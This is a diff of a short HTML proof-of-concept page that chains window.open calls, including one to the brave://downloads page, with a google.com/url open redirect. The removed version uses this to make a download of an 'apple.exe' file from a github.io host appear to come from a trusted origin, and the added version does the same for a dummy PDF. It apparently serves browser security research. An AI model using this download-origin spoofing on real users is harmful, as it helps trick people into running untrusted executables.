@@ -1,49 +1,40 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="utf-8">
-    <title>Redirect + Download PoC</title>
-    <style>
-        .button {
-            background-color: #4CAF50;
-            border: none;
-            color: white;
-            padding: 15px 32px;
-            text-align: center;
-            font-size: 16px;
-            cursor: pointer;
-        }
-    </style>
+<meta charset="utf-8">
+<title>Download Origin Confusion PoC</title>
+<style>
+button {
+    padding: 14px 28px;
+    font-size: 16px;
+    background: #4CAF50;
+    color: #fff;
+    border: none;
+    cursor: pointer;
+}
+</style>
 </head>
 <body>
 
 <script>
-function a() {
-    // Step 1: buka halaman downloads
-    window.open('brave://downloads/', 'x');
+function startPoC() {
+    const t0 = Date.now();
 
-    // Step 2: redirect ke example.com (trusted-looking page)
-    setTimeout(function () {
-        window.open('https://google.com', 'x');
-    }, 1500);
+    // User opens a trusted domain first
+    const w = window.open(
+        'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fdummy.pdf',
+        '_blank'
+    );
 
-    // Step 3: trigger download dari origin asli
-    setTimeout(function () {
-        window.open(
-            'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe',
-            'x'
-        );
-    }, 4000);
+    // Optional: log timing for analysis
+    setTimeout(() => {
+        console.log('Elapsed:', Date.now() - t0, 'ms');
+    }, 1000);
 }
 </script>
 
 <center>
-    <input
-        type="button"
-        class="button"
-        value="Download From Original Site"
-        onclick="a()"
-    >
+<button onclick="startPoC()">Download File</button>
 </center>
 
 </body>
